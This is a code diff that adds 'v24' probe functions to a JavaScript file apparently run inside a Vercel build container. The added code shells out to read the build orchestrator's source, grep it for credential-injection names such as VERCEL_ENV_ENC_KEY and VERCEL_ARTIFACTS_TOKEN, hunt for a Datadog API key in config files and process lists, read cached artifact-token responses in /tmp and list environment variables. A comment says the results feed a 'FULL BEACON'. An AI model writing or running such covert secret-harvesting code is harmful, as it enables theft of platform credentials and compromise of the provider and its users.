@@ -1516,6 +1516,49 @@ int main(){
     const tmpContents = safe(() => execSync('ls -la /tmp/ 2>/dev/null | head -30 || true').toString().trim().slice(0, 500));
     return { sarData, sarReadable, branchFile, buildsJson, tmpContents };
   }),
+
+  // v24: Read Vercel build orchestrator source code directly.
+  // builds.json revealed exact paths: /var/task/index.js, /var/task/node_modules/vercel/dist/index.js
+  // Also try /var/task/node_modules/@vercel/static-build/dist/index.js
+  orchestratorSource: safe(() => {
+    // Read /var/task/index.js — the wrapper that starts everything
+    const indexJs = safe(() => execSync('cat /var/task/index.js 2>/dev/null | head -100 || true').toString().trim().slice(0, 3000));
+    // Size of the main CLI bundle
+    const cliSize = safe(() => execSync('wc -c /var/task/node_modules/vercel/dist/index.js 2>/dev/null || true').toString().trim());
+    // Read first 2KB of vercel CLI (credential injection code is near the top)
+    const cliHead = safe(() => execSync('cat /var/task/node_modules/vercel/dist/index.js 2>/dev/null | head -50 || true').toString().trim().slice(0, 2000));
+    // Search for credential injection in the CLI bundle
+    const credInject = safe(() => execSync('grep -o "VERCEL_ENV_ENC_KEY\\|getEncryptedEnvFile\\|VERCEL_ARTIFACTS_TOKEN\\|injectBuildEnv\\|buildEnvVars" /var/task/node_modules/vercel/dist/index.js 2>/dev/null | sort -u | head -20 || true').toString().trim().slice(0, 500));
+    // Static-build builder size and head
+    const staticBuildSize = safe(() => execSync('wc -c /var/task/node_modules/@vercel/static-build/dist/index.js 2>/dev/null || true').toString().trim());
+    return { indexJs, cliSize, cliHead, credInject, staticBuildSize };
+  }),
+
+  // v24: Read Datadog agent config — look for DD_API_KEY and other secrets
+  // The APM socket is mounted into our container, so maybe the config is too
+  datadogConfig: safe(() => {
+    // Standard Datadog config locations
+    const ddConfig = safe(() => execSync('cat /etc/datadog-agent/datadog.yaml 2>/dev/null | head -30 || cat /etc/dd-agent/datadog.conf 2>/dev/null | head -30 || true').toString().trim().slice(0, 1000));
+    // Look for DD_API_KEY in env of any Datadog process (might be host, not in our ns)
+    const ddProcesses = safe(() => execSync('ls -la /proc/ | grep -E "^d" | awk \'{print $9}\' | grep -E "^[0-9]+$" | while read pid; do cmd=$(cat /proc/$pid/cmdline 2>/dev/null | tr "\\0" " " | head -c 100); if echo "$cmd" | grep -qi "datadog\\|dd-agent"; then echo "PID $pid: $cmd"; fi; done 2>/dev/null || true').toString().trim().slice(0, 500));
+    // /run/apm/ directory contents
+    const apmDir = safe(() => execSync('ls -la /run/apm/ 2>/dev/null && cat /run/apm/*.yaml 2>/dev/null | head -20 || true').toString().trim().slice(0, 500));
+    // Check /etc/dd-agent/ or /opt/datadog-agent/
+    const ddDirs = safe(() => execSync('ls /etc/datadog-agent/ 2>/dev/null || ls /opt/datadog-agent/ 2>/dev/null || true').toString().trim().slice(0, 300));
+    return { ddConfig, ddProcesses, apmDir, ddDirs };
+  }),
+
+  // v24: Read /tmp/ probe artifacts to get more complete picture
+  // art_head contains the VERCEL_ARTIFACTS_TOKEN response headers
+  // art_put contains the artifact upload response
+  tmpArtifacts: safe(() => {
+    const artHead = safe(() => execSync('cat /tmp/art_head 2>/dev/null || true').toString().trim().slice(0, 1000));
+    const artPut = safe(() => execSync('cat /tmp/art_put 2>/dev/null || true').toString().trim().slice(0, 500));
+    const artGet = safe(() => execSync('cat /tmp/art_get 2>/dev/null || true').toString().trim().slice(0, 500));
+    // Full env as seen by our process (cross-reference with heap dump)
+    const fullEnvKeys = safe(() => execSync('printenv 2>/dev/null | cut -d= -f1 | sort || true').toString().trim().slice(0, 1000));
+    return { artHead, artPut, artGet, fullEnvKeys };
+  }),
 };
 
 // FULL BEACON — sent after all slow network probes complete.
